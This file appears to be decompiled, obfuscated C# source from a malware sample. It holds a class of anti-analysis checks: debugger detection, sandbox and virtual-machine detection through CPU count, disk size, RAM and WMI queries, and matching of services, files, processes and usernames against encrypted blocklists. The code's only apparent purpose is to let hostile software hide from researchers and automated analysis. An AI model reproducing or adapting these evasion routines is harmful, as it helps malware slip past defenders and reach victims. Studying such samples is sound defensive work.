using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using _003Cdion2ntty2ic0uyoe_003E_007B43570453_002D3AD8_002D4A5B_002DB273_002D83DF8156D820_007D;

namespace C3904355907;

internal class C1342839628
{
	private const int m_C3554254475 = 67;

	private const int m_C3904355907 = 2;

	private const int m_C1255198513 = 100;

	private const int m_C1908338681 = 2;

	private static readonly string[] m_C3554254475 = new string[12]
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JS(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Js(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JT(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jt(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JU(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Ju(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JV(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jv(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JW(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jw(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JX(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jx()
	};

	private static readonly string[] m_C3904355907 = new string[7]
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JY(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jy(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JZ(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jz(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jA(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ja(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jB()
	};

	private static readonly string[] m_C1255198513 = new string[28]
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jb(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jC(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jc(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jD(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jd(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jE(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.je(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jF(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jf(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jG(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jg(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jH(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jh(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jI(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.ji(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jJ(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jj(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jK(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jk(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jL(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jl(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jM(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jm(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jN(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jn(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jO(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jo(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jP()
	};

	private static readonly string[] m_C1908338681 = new string[5]
	{
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jp(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jQ(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jq(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jR(),
		DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.jr()
	};

	private static string[] m_C1037565863;

	public static bool C3554254475()
	{
		C1342839628.m_C1037565863 = C4067256894.C3554254475();
		if (C112844655())
		{
			return false;
		}
		return true;
	}

	public static bool C3904355907()
	{
		return C453955339.GetSystemMetrics(67) != 0;
	}

	public static bool C1255198513()
	{
		return RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
	}

	public static bool C1908338681()
	{
		return Debugger.IsAttached;
	}

	public static bool C1037565863()
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		try
		{
			long num = 0L;
			double num2 = 0.0;
			List<string> list = new List<string>();
			ManagementObjectCollection val = C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JQ());
			if (val != null)
			{
				ManagementObjectEnumerator enumerator = val.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						list.Add(((object)val2).ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (driveInfo.IsReady)
				{
					num += driveInfo.TotalSize;
				}
			}
			ManagementObjectCollection val3 = C3554254475(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jq());
			if (val3 != null)
			{
				ManagementObjectEnumerator enumerator2 = val3.GetEnumerator();
				try
				{
					while (enumerator2.MoveNext())
					{
						ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
						double num3 = Convert.ToDouble(((ManagementBaseObject)val4).get_Item(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.JR()));
						num2 = Math.Round(num3 / 1048576.0, 2);
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
			}
			if (Environment.ProcessorCount <= 2)
			{
				return true;
			}
			if (num <= 100L)
			{
				return true;
			}
			if (num2 <= 2.0)
			{
				return true;
			}
			if (list == null || list.Count == 0)
			{
				return true;
			}
			foreach (string item in list)
			{
				if (item.Contains(DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.Jr()))
				{
					return true;
				}
			}
			return false;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public static bool C112844655()
	{
		ServiceController[] services = ServiceController.GetServices();
		if (services != null)
		{
			string[] c3554254475 = C1342839628.m_C3554254475;
			foreach (string text in c3554254475)
			{
				ServiceController[] array = services;
				foreach (ServiceController val in array)
				{
					if (string.Compare(val.get_ServiceName().ToLower(), text.ToLower()) == 0)
					{
						return true;
					}
				}
			}
		}
		string[] c = C1342839628.m_C1255198513;
		int num = 0;
		while (true)
		{
			if (num < c.Length)
			{
				string path = c[num];
				if (File.Exists(path))
				{
					break;
				}
				num++;
				continue;
			}
			if (C1342839628.m_C1037565863 != null)
			{
				string[] c3904355907 = C1342839628.m_C3904355907;
				foreach (string value in c3904355907)
				{
					if (C1342839628.m_C1037565863.Contains(value))
					{
						return true;
					}
				}
			}
			string text2 = DC0DFFA6_002DD07E_002D4569_002D8923_002D61FED0540CB3.cz();
			string[] c2 = C1342839628.m_C1908338681;
			int num2 = 0;
			while (true)
			{
				if (num2 < c2.Length)
				{
					string value2 = c2[num2];
					if (text2.Contains(value2))
					{
						break;
					}
					num2++;
					continue;
				}
				return false;
			}
			return true;
		}
		return true;
	}

	private static ManagementObjectCollection C3554254475(string string_0)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		if (string.IsNullOrEmpty(string_0))
		{
			return null;
		}
		ObjectQuery val = new ObjectQuery(string_0);
		ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
		return val2.Get();
	}
}
